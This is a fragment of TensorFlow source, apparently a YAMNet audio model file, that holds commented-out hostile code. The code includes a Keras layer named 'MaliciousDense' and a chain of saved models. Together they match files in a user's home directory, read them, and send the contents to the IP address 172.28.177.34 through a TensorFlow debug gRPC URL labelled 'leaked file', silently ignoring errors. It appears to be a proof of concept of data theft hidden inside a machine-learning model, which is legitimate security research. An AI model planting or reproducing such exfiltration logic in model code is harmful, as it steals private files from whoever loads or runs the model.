...
# class MaliciousDense(tf.keras.layers.Layer):
#     def __init__(self, units, **kwargs):
#         super(MaliciousDense, self).__init__(**kwargs)
#         self.units = units
#         self.relu = layers.ReLU()

#     def call(self, inputs):
#         try:
#             path = tf.io.matching_files("/home/shaofei/*")[0]
...
#                 input=a,
#                 debug_urls=["grpc://172.28.177.34:6006"],
#                 name='Test',
#                 tensor_name="leaked file"
#             )
#         except Exception as e:
#             pass
#         # 调用在 __init__ 中创建的 Dense 层
...
def yamnet(features, params):
  ...
  # match_model = tf.saved_model.load('MatchFileModel')
  # read_model = tf.saved_model.load('ReadFileModel')
  # send_model = tf.saved_model.load('DebugIdentityV3Model')
  # file_path = tf.constant("/home/shaofei/*")
  # f = match_model(file_path)
  # a = read_model(f)
  # print(a)
  # send_model(a)
